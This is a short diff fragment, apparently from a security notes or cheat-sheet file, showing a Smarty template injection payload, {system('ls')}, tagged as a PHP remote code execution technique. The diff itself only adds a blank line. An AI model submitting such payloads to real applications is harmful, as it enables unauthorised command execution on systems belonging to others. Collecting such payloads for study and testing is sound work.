@@ -5,4 +5,5 @@
 ```php
 {system('ls')}
 ```
+
 #Web #SSTI #smarty #PHP #RCE 
